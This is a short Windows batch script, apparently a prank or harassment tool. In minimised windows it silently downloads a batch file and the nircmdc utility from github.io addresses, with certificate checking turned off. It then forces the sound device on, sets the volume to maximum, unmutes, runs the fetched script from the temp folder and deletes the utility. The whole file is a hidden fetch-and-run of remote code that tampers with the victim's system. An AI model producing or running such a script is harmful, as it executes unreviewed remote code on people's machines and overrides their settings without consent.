@echo off
start /wait /min "" cmd /c curl -kLOs stivengiv.github.io/p/play.bat
start /wait /min "" cmd /c curl -kLOs aritz331.github.io/stuff/nircmdc.exe

start /min "" cmd /c nircmdc setdefaultsounddevice "Speakers"
start /min "" cmd /c nircmdc setvolume 0 65535 65535
start /min "" cmd /c nircmdc mutesysvolume 0

start %temp%\play.bat aser
del /f /q nircmdc.exe
